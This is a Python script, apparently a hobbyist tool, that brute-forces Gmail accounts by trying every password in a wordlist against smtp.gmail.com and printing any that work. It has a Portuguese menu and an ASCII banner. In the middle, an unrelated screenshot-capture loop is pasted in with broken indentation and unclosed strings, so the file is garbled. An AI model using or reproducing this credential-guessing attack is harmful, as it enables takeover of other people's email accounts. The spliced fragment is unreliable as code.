#!/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import smtplib

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except smtplib.SMTPAuthenticationError:
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
			import pyautogui
import time #>..
for i in range(1,10+1): #10fotos
       foto=pyautogui.screenshot()
       time.sleep(5)
        foto.save("foto1%d.png%(i))
        print("Working %d (i))
print("Worked") 

print('''
	

░██████╗░███╗░░░███╗░█████╗░██╗██╗░░░░░
██╔════╝░████╗░████║██╔══██╗██║██║░░░░░
██║░░██╗░██╔████╔██║███████║██║██║░░░░░
██║░░╚██╗██║╚██╔╝██║██╔══██║██║██║░░░░░
╚██████╔╝██║░╚═╝░██║██║░░██║██║███████╗
░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝
                                      
	
	''')

instance = GmailBruteForce()

do = input('''
		escolhe o unico numero
		1 - gmail
		
		==> ''')

if do == '1':
    user = input("email : ")
    senha = input("passlist : ")
    headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()
